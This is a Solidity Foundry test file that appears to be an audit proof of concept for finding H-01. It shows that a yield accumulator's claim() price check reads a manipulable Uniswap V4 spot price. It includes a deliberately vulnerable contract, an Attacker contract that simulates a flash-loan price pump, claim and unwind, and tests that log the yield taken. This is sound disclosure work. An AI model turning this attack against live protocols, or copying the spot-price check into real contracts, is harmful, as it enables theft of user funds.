// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

/**
 * @title H-01 PoC: Spot Price Oracle Manipulation Bypasses targetPrice Minimum in claim()
 * @notice STANDALONE POC - Only imports forge-std/Test.sol
 *
 * @dev Vulnerability Location: StableYieldAccumulator.sol#L731 (_getPhUSDPriceInUSDS)
 *      Used at: StableYieldAccumulator.sol#L573-L578 (claim() price check)
 *
 * VULNERABILITY SUMMARY:
 * _getPhUSDPriceInUSDS() reads the instantaneous spot price from the Uniswap V4
 * PoolManager via StateLibrary.getSlot0(). This spot price is trivially manipulable
 * within a single transaction via flash loans or large swaps. An attacker can:
 *   1. Flash-swap to pump the phUSD spot price above targetPrice
 *   2. Call claim() which now passes the price check
 *   3. Unwind the flash-swap in the same transaction
 *
 * The targetPrice check at lines 573-578 is meant to prevent claims when phUSD is
 * trading below its intended peg, but using an unprotected spot price makes this
 * check entirely bypassable.
 *
 * WHAT THIS POC DEMONSTRATES:
 * 1. When the PoolManager returns a spot price BELOW targetPrice, claim() reverts
 * 2. By simply changing the PoolManager's returned spot price (simulating a
 *    flash-manipulation), claim() succeeds in the same context
 * 3. The price check provides zero protection against atomic manipulation
 *
 * INLINED CODE:
 * - Simplified StableYieldAccumulator with the vulnerable _getPhUSDPriceInUSDS()
 * - MockPoolManager implementing extsload() for StateLibrary compatibility
 * - FullMath.mulDiv from Uniswap v4-core (used in price calculation)
 * - Mock ERC20, YieldStrategy, Phlimbo contracts
 */

// ============================================================================
// INLINED DEPENDENCIES
// ============================================================================

/// @notice Minimal ERC20 implementation for testing
contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @notice Mock PoolManager that returns configurable sqrtPriceX96 via extsload
/// @dev StateLibrary.getSlot0() calls manager.extsload(stateSlot) and unpacks
///      the bottom 160 bits as sqrtPriceX96. Our mock simply returns sqrtPriceX96
///      packed into the bottom 160 bits of a bytes32 for any slot query.
contract MockPoolManager {
    uint160 public mockSqrtPriceX96;

    function setSqrtPriceX96(uint160 _sqrtPriceX96) external {
        mockSqrtPriceX96 = _sqrtPriceX96;
    }

    /// @notice Called by StateLibrary.getSlot0 to read pool slot0 data
    /// @dev Returns sqrtPriceX96 in the bottom 160 bits (tick=0, fees=0)
    function extsload(bytes32) external view returns (bytes32) {
        return bytes32(uint256(mockSqrtPriceX96));
    }

    /// @notice Overload for multi-slot reads (not used but needed for interface)
    function extsload(bytes32, uint256) external pure returns (bytes32[] memory) {
        return new bytes32[](0);
    }
}

/// @notice Mock yield strategy that reports configurable yield
contract MockYieldStrategy {
    mapping(address => mapping(address => uint256)) public principals;
    mapping(address => mapping(address => uint256)) public yields;

    function setBalances(address token, address account, uint256 principal, uint256 yieldAmt) external {
        principals[token][account] = principal;
        yields[token][account] = yieldAmt;
    }

    function totalBalanceOf(address token, address account) external view returns (uint256) {
        return principals[token][account] + yields[token][account];
    }

    function principalOf(address token, address account) external view returns (uint256) {
        return principals[token][account];
    }

    function withdrawFrom(address token, address, uint256 amount, address recipient) external {
        MockERC20(token).transfer(recipient, amount);
    }
}

/// @notice Mock Phlimbo that pulls reward tokens from the accumulator
contract MockPhlimbo {
    address public rewardToken;
    address public accumulator;

    constructor(address _rewardToken) {
        rewardToken = _rewardToken;
    }

    function setAccumulator(address _acc) external {
        accumulator = _acc;
    }

    function collectReward(uint256 amount) external {
        MockERC20(rewardToken).transferFrom(msg.sender, address(this), amount);
    }
}

/// @notice Mock sUSDS ERC4626 vault (1:1 conversion for simplicity)
contract MockSUSDS {
    function convertToAssets(uint256 shares) external pure returns (uint256) {
        return shares; // 1:1 conversion
    }
}

// ============================================================================
// INLINED: FullMath.mulDiv from Uniswap v4-core
// ============================================================================

/// @notice 512-bit math from Uniswap v4-core/src/libraries/FullMath.sol
library FullMath {
    function mulDiv(uint256 a, uint256 b, uint256 denominator) internal pure returns (uint256 result) {
        unchecked {
            uint256 prod0 = a * b;
            uint256 prod1;
            assembly ("memory-safe") {
                let mm := mulmod(a, b, not(0))
                prod1 := sub(sub(mm, prod0), lt(mm, prod0))
            }
            require(denominator > prod1);
            if (prod1 == 0) {
                assembly ("memory-safe") {
                    result := div(prod0, denominator)
                }
                return result;
            }
            uint256 remainder;
            assembly ("memory-safe") {
                remainder := mulmod(a, b, denominator)
            }
            assembly ("memory-safe") {
                prod1 := sub(prod1, gt(remainder, prod0))
                prod0 := sub(prod0, remainder)
            }
            uint256 twos = (0 - denominator) & denominator;
            assembly ("memory-safe") {
                denominator := div(denominator, twos)
            }
            assembly ("memory-safe") {
                prod0 := div(prod0, twos)
            }
            assembly ("memory-safe") {
                twos := add(div(sub(0, twos), twos), 1)
            }
            prod0 |= prod1 * twos;
            uint256 inv = (3 * denominator) ^ 2;
            inv *= 2 - denominator * inv;
            inv *= 2 - denominator * inv;
            inv *= 2 - denominator * inv;
            inv *= 2 - denominator * inv;
            inv *= 2 - denominator * inv;
            inv *= 2 - denominator * inv;
            result = prod0 * inv;
            return result;
        }
    }
}

// ============================================================================
// INLINED: Simplified StableYieldAccumulator (vulnerable pattern only)
// ============================================================================

/// @notice Simplified SYA that reproduces the exact vulnerable claim() logic
/// @dev Inlines _getPhUSDPriceInUSDS() which reads spot price from PoolManager
///      via the same extsload pattern that StateLibrary.getSlot0 uses.
///
/// Key vulnerable code from StableYieldAccumulator.sol lines 573-578:
///   if (address(poolManager) != address(0) && targetPrice > 0) {
///       uint256 currentPrice = _getPhUSDPriceInUSDS();
///       if (currentPrice < targetPrice) {
///           revert phUSDPriceBelowTarget(...);
///       }
///   }
///
/// And _getPhUSDPriceInUSDS() at line 731-782 reads:
///   (uint160 sqrtPriceX96,,,) = poolManager.getSlot0(pricePoolId);
///   ...calculates price from sqrtPriceX96...
contract VulnerableSYA {
    // ---- State variables matching the real contract ----
    address public rewardToken;
    address public phlimbo;
    address public minterAddress;
    uint256 public discountRate;
    uint256 public targetPrice;
    bool public token0IsPhUSD;
    address public phUSD;
    address public poolManagerAddr;
    address public sUSDSAddr;
    bytes32 public pricePoolId;

    // Strategy management
    address[] public yieldStrategies;
    mapping(address => address) public strategyTokens;
    mapping(address => TokenConfig) public tokenConfigs;

    struct TokenConfig {
        uint8 decimals;
        uint256 normalizedExchangeRate;
        bool paused;
    }

    // ---- Errors matching the real contract ----
    error ZeroAddress();
    error ZeroAmount();
    error TokenIsPaused();
    error phUSDPriceBelowTarget(address phUSD_, address poolManager_, uint256 pricePoolId_);

    // ---- Events ----
    event RewardsCollected(address indexed strategy, uint256 amount);
    event RewardsClaimed(address indexed claimer, uint256 amountPaid, uint256 strategiesClaimed);

    // ---- Configuration functions (owner) ----
    function setRewardToken(address _t) external { rewardToken = _t; }
    function setPhlimbo(address _p) external { phlimbo = _p; }
    function setMinter(address _m) external { minterAddress = _m; }
    function setDiscountRate(uint256 _r) external { discountRate = _r; }
    function setTargetPrice(uint256 _tp) external { targetPrice = _tp; }
    function setToken0IsPhUSD(bool _b) external { token0IsPhUSD = _b; }
    function setPhUSD(address _ph) external { phUSD = _ph; }
    function setPoolManager(address _pm) external { poolManagerAddr = _pm; }
    function setSUSDS(address _s) external { sUSDSAddr = _s; }
    function setPricePool(bytes32 _pid) external { pricePoolId = _pid; }

    function addYieldStrategy(address strategy, address token) external {
        yieldStrategies.push(strategy);
        strategyTokens[strategy] = token;
    }

    function setTokenConfig(address token, uint8 decimals_, uint256 rate) external {
        tokenConfigs[token].decimals = decimals_;
        tokenConfigs[token].normalizedExchangeRate = rate;
    }

    function approvePhlimbo(uint256 amount) external {
        MockERC20(rewardToken).approve(phlimbo, amount);
    }

    // ---- claim() -- reproduces the vulnerable logic exactly ----
    /// @notice Exact reproduction of StableYieldAccumulator.claim() lines 566-615
    function claim() external {
        if (phlimbo == address(0)) revert ZeroAddress();
        if (rewardToken == address(0)) revert ZeroAddress();
        if (minterAddress == address(0)) revert ZeroAddress();

        // VULNERABLE: Price minimum check using spot price (lines 573-578)
        if (poolManagerAddr != address(0) && targetPrice > 0) {
            uint256 currentPrice = _getPhUSDPriceInUSDS();
            if (currentPrice < targetPrice) {
                revert phUSDPriceBelowTarget(phUSD, poolManagerAddr, uint256(pricePoolId));
            }
        }

        uint256 totalNormalizedYield = 0;
        uint256 strategiesWithYield = 0;

        for (uint256 i = 0; i < yieldStrategies.length; i++) {
            address strategy = yieldStrategies[i];
            address token = strategyTokens[strategy];
            if (token == address(0)) continue;
            if (tokenConfigs[token].paused) revert TokenIsPaused();

            uint256 yieldAmt = _getYieldForStrategy(strategy, token);
            if (yieldAmt > 0) {
                MockYieldStrategy(strategy).withdrawFrom(token, minterAddress, yieldAmt, msg.sender);
                emit RewardsCollected(strategy, yieldAmt);
                totalNormalizedYield += _normalizeAmount(yieldAmt, token);
                strategiesWithYield++;
            }
        }

        if (totalNormalizedYield == 0) revert ZeroAmount();

        uint256 claimerPayment = totalNormalizedYield * (10000 - discountRate) / 10000;
        uint256 actualPayment = _denormalizeAmount(claimerPayment, rewardToken);

        MockERC20(rewardToken).transferFrom(msg.sender, address(this), actualPayment);

        // Call phlimbo.collectReward
        MockPhlimbo(phlimbo).collectReward(actualPayment);

        emit RewardsClaimed(msg.sender, actualPayment, strategiesWithYield);
    }

    // ---- _getPhUSDPriceInUSDS() -- the vulnerable function (lines 731-782) ----
    /// @notice Reads SPOT price from PoolManager via extsload (manipulable!)
    /// @dev This is the exact logic from the real contract.
    ///      StateLibrary.getSlot0 calls manager.extsload(stateSlot) and extracts
    ///      sqrtPriceX96 from the bottom 160 bits.
    function _getPhUSDPriceInUSDS() internal view returns (uint256) {
        // Reproduce StateLibrary.getSlot0 behavior:
        // Compute the state slot (simplified -- real uses keccak of poolId + POOLS_SLOT)
        bytes32 stateSlot = keccak256(abi.encodePacked(pricePoolId, bytes32(uint256(6))));

        // Call extsload on the pool manager (exactly as StateLibrary does)
        bytes32 data = MockPoolManager(poolManagerAddr).extsload(stateSlot);

        // Extract sqrtPriceX96 from bottom 160 bits (StateLibrary assembly)
        uint160 sqrtPriceX96;
        assembly ("memory-safe") {
            sqrtPriceX96 := and(data, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)
        }

        // Calculate price from sqrtPriceX96 (exact logic from lines 745-771)
        uint256 priceInSUSDS;

        if (token0IsPhUSD) {
            // price = sqrtPriceX96^2 * 1e18 / 2^192
            priceInSUSDS = FullMath.mulDiv(
                uint256(sqrtPriceX96) * uint256(sqrtPriceX96),
                1e18,
                1 << 192
            );
        } else {
            // price = 1e18 * 2^192 / sqrtPriceX96^2
            priceInSUSDS = FullMath.mulDiv(
                1e18,
                1 << 192,
                uint256(sqrtPriceX96) * uint256(sqrtPriceX96)
            );
        }

        // Convert sUSDS to USDS (lines 776-781)
        if (sUSDSAddr != address(0)) {
            return MockSUSDS(sUSDSAddr).convertToAssets(priceInSUSDS);
        }

        return priceInSUSDS;
    }

    function _getYieldForStrategy(address strategy, address token) internal view returns (uint256) {
        uint256 totalBalance = MockYieldStrategy(strategy).totalBalanceOf(token, minterAddress);
        uint256 principal = MockYieldStrategy(strategy).principalOf(token, minterAddress);
        if (totalBalance > principal) return totalBalance - principal;
        return 0;
    }

    function _normalizeAmount(uint256 amount, address token) internal view returns (uint256) {
        uint8 dec = tokenConfigs[token].decimals;
        uint256 rate = tokenConfigs[token].normalizedExchangeRate;
        if (dec == 0 && rate == 0) return amount;
        uint256 scaled = amount;
        if (dec < 18) scaled = amount * (10 ** (18 - dec));
        if (rate > 0 && rate != 1e18) scaled = scaled * rate / 1e18;
        return scaled;
    }

    function _denormalizeAmount(uint256 amount, address token) internal view returns (uint256) {
        uint8 dec = tokenConfigs[token].decimals;
        uint256 rate = tokenConfigs[token].normalizedExchangeRate;
        if (dec == 0 && rate == 0) return amount;
        uint256 scaled = amount;
        if (rate > 0 && rate != 1e18) scaled = scaled * 1e18 / rate;
        if (dec < 18) scaled = scaled / (10 ** (18 - dec));
        return scaled;
    }

    /// @notice Exposes the price function for testing
    function getPhUSDPriceInUSDS() external view returns (uint256) {
        return _getPhUSDPriceInUSDS();
    }
}

/// @notice Attacker contract that performs the atomic manipulation + claim
/// @dev In a real attack, this would use a flash loan to manipulate the pool,
///      then call claim(), then unwind. Here we simulate with the mock.
contract Attacker {
    VulnerableSYA public sya;
    MockPoolManager public poolManager;
    MockERC20 public rewardToken;
    uint160 public pumpedSqrtPrice;

    constructor(
        address _sya,
        address _pm,
        address _rewardToken,
        uint160 _pumpedSqrtPrice
    ) {
        sya = VulnerableSYA(_sya);
        poolManager = MockPoolManager(_pm);
        rewardToken = MockERC20(_rewardToken);
        pumpedSqrtPrice = _pumpedSqrtPrice;
    }

    /// @notice Simulates an atomic flash-manipulation attack
    /// @dev In reality: flash loan -> swap to pump price -> claim -> swap back -> repay
    ///      Here we simulate with setSqrtPriceX96 (equivalent to the pool state change)
    function executeAtomicAttack(uint160 originalPrice) external {
        // Step 1: Flash-manipulate the pool price upward
        // (In reality: flash loan large amount, swap in the Uni V4 pool)
        poolManager.setSqrtPriceX96(pumpedSqrtPrice);

        // Step 2: Approve SYA to spend our reward tokens
        rewardToken.approve(address(sya), type(uint256).max);

        // Step 3: Call claim() -- spot price now passes the targetPrice check
        sya.claim();

        // Step 4: Unwind the manipulation (return pool to original price)
        // (In reality: swap back and repay flash loan)
        poolManager.setSqrtPriceX96(originalPrice);

        // Result: Attacker claimed yield while the TRUE market price was below target
    }
}

// ============================================================================
// PROOF OF CONCEPT TEST
// ============================================================================

contract H01PoCTest is Test {
    VulnerableSYA public sya;
    MockPoolManager public mockPM;
    MockSUSDS public mockSUSDS;
    MockERC20 public rewardToken;
    MockERC20 public strategyToken;
    MockYieldStrategy public yieldStrategy;
    MockPhlimbo public mockPhlimbo;

    address public owner;
    address public attacker;
    address public minterAddr;
    address public phUSDAddr;

    // sqrtPriceX96 values for specific prices
    // sqrtPriceX96 = sqrt(price) * 2^96

    // Price = 0.90 (below target of 0.95)
    // sqrt(0.90) = 0.9486832... * 2^96 = 75166920096232236089664808974
    uint160 constant SQRT_PRICE_090 = 75166920096232236089664808974;

    // Price = 0.80 (well below target)
    // sqrt(0.80) = 0.8944271... * 2^96 = 70872208618498190416793626326
    uint160 constant SQRT_PRICE_080 = 70872208618498190416793626326;

    // Price = 1.00 (at peg, above target of 0.95)
    // sqrt(1.00) = 1.0 * 2^96 = 79228162514264337593543950336
    uint160 constant SQRT_PRICE_100 = 79228162514264337593543950336;

    // Price = 1.10 (above peg, well above target)
    // sqrt(1.10) = 1.0488... * 2^96 = 83077498137502453155780008628
    uint160 constant SQRT_PRICE_110 = 83077498137502453155780008628;

    // Target price: 0.95e18 (95 cents -- protocol does not want claims when phUSD < $0.95)
    uint256 constant TARGET_PRICE = 0.95e18;

    // Yield amount available in strategy
    uint256 constant YIELD_AMOUNT = 10_000e18; // 10,000 tokens of yield

    function setUp() public {
        owner = address(this);
        attacker = makeAddr("attacker");
        minterAddr = makeAddr("minter");
        phUSDAddr = makeAddr("phUSD");

        // Deploy mock contracts
        rewardToken = new MockERC20("Reward Token", "RWD", 18);
        strategyToken = new MockERC20("Strategy Token", "STK", 18);
        mockPM = new MockPoolManager();
        mockSUSDS = new MockSUSDS();
        yieldStrategy = new MockYieldStrategy();

        // Deploy the vulnerable SYA (simplified reproduction)
        sya = new VulnerableSYA();

        // Deploy mock Phlimbo
        mockPhlimbo = new MockPhlimbo(address(rewardToken));
        mockPhlimbo.setAccumulator(address(sya));

        // Configure the SYA
        sya.setRewardToken(address(rewardToken));
        sya.setPhlimbo(address(mockPhlimbo));
        sya.setMinter(minterAddr);
        sya.setDiscountRate(200); // 2% discount
        sya.setPhUSD(phUSDAddr);
        sya.setPoolManager(address(mockPM));
        sya.setSUSDS(address(mockSUSDS));
        sya.setPricePool(bytes32(uint256(1)));
        sya.setToken0IsPhUSD(true);
        sya.setTargetPrice(TARGET_PRICE);

        // Add yield strategy
        sya.addYieldStrategy(address(yieldStrategy), address(strategyToken));
        sya.setTokenConfig(address(strategyToken), 18, 1e18);
        sya.setTokenConfig(address(rewardToken), 18, 1e18);

        // Fund strategy with yield tokens
        yieldStrategy.setBalances(address(strategyToken), minterAddr, 100_000e18, YIELD_AMOUNT);
        strategyToken.mint(address(yieldStrategy), YIELD_AMOUNT);

        // Approve phlimbo to pull tokens from SYA
        sya.approvePhlimbo(type(uint256).max);
    }

    // ========================================================================
    // TEST 1: claim() correctly reverts when spot price is below target
    // ========================================================================

    function test_H01_ClaimRevertsWhenPriceBelowTarget() public {
        console.log("=== H-01 PoC: Spot Price Oracle Manipulation ===");
        console.log("");
        console.log("TEST 1: Verify claim() reverts when spot price < targetPrice");
        console.log("");

        // Set spot price to 0.90 (below target of 0.95)
        mockPM.setSqrtPriceX96(SQRT_PRICE_090);

        uint256 reportedPrice = sya.getPhUSDPriceInUSDS();
        console.log("  Target price:  ", TARGET_PRICE, "(0.95e18)");
        console.log("  Current price: ", reportedPrice, "(~0.90e18)");
        console.log("  Price < target:", reportedPrice < TARGET_PRICE ? "YES" : "NO");
        console.log("");

        // Fund attacker with reward tokens
        uint256 paymentNeeded = YIELD_AMOUNT * 98 / 100; // 2% discount
        rewardToken.mint(attacker, paymentNeeded);

        vm.startPrank(attacker);
        rewardToken.approve(address(sya), type(uint256).max);

        // claim() should revert with phUSDPriceBelowTarget
        vm.expectRevert(
            abi.encodeWithSelector(
                VulnerableSYA.phUSDPriceBelowTarget.selector,
                phUSDAddr,
                address(mockPM),
                uint256(bytes32(uint256(1)))
            )
        );
        sya.claim();
        vm.stopPrank();

        console.log("  RESULT: claim() correctly reverted with phUSDPriceBelowTarget");
        console.log("");
    }

    // ========================================================================
    // TEST 2: Attacker bypasses the check by flash-manipulating spot price
    // ========================================================================

    function test_H01_AttackerBypassesPriceCheckViaSpotManipulation() public {
        console.log("=== H-01 PoC: Spot Price Oracle Manipulation ===");
        console.log("");
        console.log("TEST 2: Attacker bypasses price check by manipulating spot price");
        console.log("");

        // TRUE market price is 0.90 (well below target of 0.95)
        uint160 truePrice = SQRT_PRICE_090;
        mockPM.setSqrtPriceX96(truePrice);

        uint256 trueReportedPrice = sya.getPhUSDPriceInUSDS();
        console.log("  True market price:   ", trueReportedPrice, "(~0.90e18)");
        console.log("  Target price:        ", TARGET_PRICE, "(0.95e18)");
        console.log("  True price < target: YES -- claim SHOULD be blocked");
        console.log("");

        // Fund attacker
        uint256 paymentNeeded = YIELD_AMOUNT * 98 / 100;
        rewardToken.mint(attacker, paymentNeeded);

        // Deploy attacker contract that performs atomic manipulation
        Attacker attackerContract = new Attacker(
            address(sya),
            address(mockPM),
            address(rewardToken),
            SQRT_PRICE_110 // Pump price to 1.10 (well above target)
        );

        // Transfer reward tokens to attacker contract
        vm.prank(attacker);
        rewardToken.transfer(address(attackerContract), paymentNeeded);

        // Record balances before attack
        uint256 attackerYieldBefore = strategyToken.balanceOf(address(attackerContract));
        uint256 phlimboBefore = rewardToken.balanceOf(address(mockPhlimbo));

        console.log("  Step 1: Attacker atomically pumps spot price to 1.10");

        // Verify the manipulated price passes the check
        mockPM.setSqrtPriceX96(SQRT_PRICE_110);
        uint256 manipulatedPrice = sya.getPhUSDPriceInUSDS();
        console.log("  Manipulated price:   ", manipulatedPrice, "(~1.10e18)");
        console.log("  Manipulated >= target:", manipulatedPrice >= TARGET_PRICE ? "YES" : "NO");
        mockPM.setSqrtPriceX96(truePrice); // Reset for the atomic attack
        console.log("");

        console.log("  Step 2: Attacker calls claim() while price is pumped");

        // Execute the atomic attack
        attackerContract.executeAtomicAttack(truePrice);

        // Record balances after attack
        uint256 attackerYieldAfter = strategyToken.balanceOf(address(attackerContract));
        uint256 phlimboAfter = rewardToken.balanceOf(address(mockPhlimbo));
        uint256 poolPriceAfterAttack = sya.getPhUSDPriceInUSDS();

        console.log("  Step 3: Attacker unwinds manipulation, price returns to 0.90");
        console.log("");

        console.log("=== ATTACK RESULTS ===");
        console.log("");
        console.log("  Yield stolen by attacker:  ", attackerYieldAfter - attackerYieldBefore);
        console.log("  Reward paid to phlimbo:    ", phlimboAfter - phlimboBefore);
        console.log("  Pool price after attack:   ", poolPriceAfterAttack, "(back to ~0.90)");
        console.log("");

        // ASSERTIONS proving the vulnerability
        // 1. Attacker received the full yield
        assertEq(
            attackerYieldAfter - attackerYieldBefore,
            YIELD_AMOUNT,
            "Attacker should have received all yield tokens"
        );

        // 2. Phlimbo received the discounted payment
        assertEq(
            phlimboAfter - phlimboBefore,
            paymentNeeded,
            "Phlimbo should have received discounted payment"
        );

        // 3. Pool price is back to the true (below-target) price
        assertTrue(
            poolPriceAfterAttack < TARGET_PRICE,
            "Pool price should be back below target after unwinding"
        );

        console.log("CRITICAL: Claim succeeded despite true price (0.90) being below target (0.95)!");
        console.log("The attacker atomically manipulated the spot price to bypass the check.");
        console.log("");
        console.log("=== VULNERABILITY CONFIRMED ===");
    }

    // ========================================================================
    // TEST 3: Side-by-side comparison within a single test
    // ========================================================================

    function test_H01_SideBySideComparison() public {
        console.log("=== H-01 PoC: Side-by-Side Comparison ===");
        console.log("");
        console.log("Same true price (0.90), same target (0.95):");
        console.log("  - Without manipulation: claim reverts");
        console.log("  - With manipulation: claim succeeds");
        console.log("");

        uint256 paymentNeeded = YIELD_AMOUNT * 98 / 100;

        // ---- Part A: Without manipulation, claim reverts ----
        mockPM.setSqrtPriceX96(SQRT_PRICE_090);

        rewardToken.mint(attacker, paymentNeeded);
        vm.startPrank(attacker);
        rewardToken.approve(address(sya), type(uint256).max);

        bool reverted = false;
        try sya.claim() {
            // Should not reach here
        } catch {
            reverted = true;
        }
        vm.stopPrank();

        assertTrue(reverted, "Part A: claim() should revert at true price 0.90");
        console.log("  Part A: claim() reverted at true price 0.90 -- CORRECT behavior");

        // ---- Part B: With manipulation, claim succeeds ----

        // Simulate the attacker flash-manipulating the price
        mockPM.setSqrtPriceX96(SQRT_PRICE_100); // Pump to 1.00 (just above 0.95 target)

        uint256 attackerYieldBefore = strategyToken.balanceOf(attacker);

        vm.prank(attacker);
        sya.claim(); // This time it succeeds!

        uint256 attackerYieldAfter = strategyToken.balanceOf(attacker);

        // Attacker immediately unwinds -- pool returns to true price
        mockPM.setSqrtPriceX96(SQRT_PRICE_090);

        assertEq(
            attackerYieldAfter - attackerYieldBefore,
            YIELD_AMOUNT,
            "Part B: attacker received yield despite true price being below target"
        );

        console.log("  Part B: claim() succeeded with manipulated price 1.00 -- VULNERABILITY");
        console.log("");
        console.log("  After unwinding, pool price is back to 0.90 (below target).");
        console.log("  The targetPrice check provided ZERO protection.");
        console.log("");
        console.log("=== VULNERABILITY CONFIRMED ===");
    }
}
